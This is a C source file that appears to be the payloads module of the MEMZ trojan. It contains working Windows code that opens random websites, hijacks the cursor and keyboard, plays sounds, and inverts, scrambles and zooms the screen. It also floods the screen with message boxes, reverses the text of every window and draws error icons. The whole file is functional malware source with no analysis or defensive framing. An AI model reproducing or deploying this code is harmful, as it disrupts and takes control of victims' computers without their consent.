#include "memz.h"

const PAYLOAD payloads[] = {
	{ payloadExecute, 30000 },
	{ payloadCursor, 30000 },
	{ payloadKeyboard, 20000 },
	{ payloadSound, 50000 },
	{ payloadBlink, 30000 },
	{ payloadMessageBox, 20000 },
	{ payloadDrawErrors, 10000 },
	{ payloadChangeText, 40000 },
	{ payloadPIP, 60000 },
	{ payloadPuzzle, 15000 }
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);

DWORD WINAPI payloadThread(LPVOID parameter) {
	int delay = 0;
	int times = 0;
	int runtime = 0;

	int(*function)(int, int) = (int(*)(int, int))parameter;

	for (;;) {
		if (delay-- == 0) {
			delay = (*function)(times++, runtime);
		}

		runtime++;
		Sleep(10);
	}
}

int payloadExecute(int times, int runtime) {
	ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);

	return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
}

int payloadBlink(int times, int runtime) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);

	return 100;
}

int payloadCursor(int times, int runtime) {
	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 1)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 1)));

	return 2;
}

int payloadMessageBox(int times, int runtime) {
	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);

	return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

int payloadChangeText(int times, int runtime) {
	EnumWindows(&EnumWindowProc, NULL);

	return 50;
}

BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam) {
	enumerateChildren(hwnd);

	return TRUE;
}

void enumerateChildren(HWND hwnd) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
	strReverseW(str);
	SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

	GlobalFree(str);

	HWND child = GetWindow(hwnd, GW_CHILD);

	while (child) {
		enumerateChildren(child);
		child = GetWindow(child, GW_HWNDNEXT);
	}
}

int payloadSound(int times, int runtime) {
	PlaySoundA(sounds[random() % nSounds], NULL, SND_ASYNC);
	return 20 + (random() % 20);
}

int payloadPuzzle(int times, int runtime) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	return 200.0 / (times / 5.0 + 1) + 3;
}

int payloadKeyboard(int times, int runtime) {
	INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	return 300 + (random() % 400);
}

int payloadPIP(int times, int runtime) {
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	return 200.0 / (times / 5.0 + 1) + 4;
}

int payloadDrawErrors(int times, int runtime) {
	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
	}
	
	ReleaseDC(hwnd, hdc);

	return 2;
}
